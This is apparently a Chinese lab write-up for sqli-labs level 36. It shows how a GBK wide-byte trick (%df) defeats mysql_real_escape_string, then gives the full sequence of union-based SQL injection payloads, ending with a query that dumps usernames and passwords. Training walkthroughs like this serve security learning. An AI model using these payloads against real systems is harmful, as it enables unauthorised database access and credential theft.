---
title: less36
url: https://www.yuque.com/u29002979/ep2zrx/akqnsfaraizokiyc
---

```bash
function check_quotes($string)
{
    $string= mysql_real_escape_string($string);    
    return $string;
}

mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

上面的check\_quotes()函数是利用了mysql\_real\_escape\_string()函数进行的过滤。
**mysql\_real\_escape\_string()函数**转义 SQL 语句中使用的字符串中的特殊字符。
下列字符受影响：

- **\x00**
- **\n**
- **\r**
- ****
- **'**
- **"**
- **\x1a**

通过页面回显发现依旧是**宽字节注入**\ <a name="JU3F6"></a>

# 注入点检查

`?id=1'`

> Hint: The Query String you input is escaped as : 1'
> The Query String you input in Hex becomes : 315c27
> 十六进制

单引号被转义，利用**%df**突破

<a name="jqyPJ"></a>

# 宽字节注入

<a name="izUqu"></a>

## 判断字段数

`?id=1%df' order by 4--+  ` <a name="B0iQ5"></a>

## 回显点检查

`?id=-1%df' union select 1,2,3--+` <a name="kzUVz"></a>

## 信息收集

主要看用户,数据库版本 ,
`?id=1 %df' and 1=2 union select 1,user(),version()--+`\ <a name="kzVJM"></a>

## 开始注入

```bash
爆破数据库名称
?id=-1%df' union select 1,2,database()--+

爆破数据库表名称
?id=-1%df' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+

爆破字段名称
users的16进制是0x7573657273
?id=-1%df' union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+

爆破字段内容
?id=-1%df' union select 1,2,(select group_concat(username,0x7e,password) from users)--+
```
